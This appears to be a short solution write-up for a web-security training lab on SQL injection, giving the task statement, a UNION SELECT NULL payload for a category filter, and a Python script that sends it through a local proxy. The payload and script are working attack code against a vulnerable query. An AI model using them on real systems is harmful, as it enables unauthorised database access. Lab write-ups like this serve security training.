This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

---

**Payload:**
```php
/filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL--
```

`GET request`

`needs session()`

```python
#!/usr/bin/python3

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def union_atk(s, url):
	exploit_url = url + "filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL--"
	r = requests.get(exploit_url, verify=False, proxies=proxies)
	if 'Home' in r.text:
		print('(+) Exploit success!')
		
	else:
		print('(-) Exploit failed')

def main():
	if len(sys.argv) != 2:
		print('(+) Usage: %s www.example.com/' % sys.argv[0])
		sys.exit(-1)
	
	s = requests.Session()
	url = sys.argv[1]
	union_atk(s, url)

if __name__ == '__main__':
	main()
```

---

**Completed:** _17:35 2024-08-30_
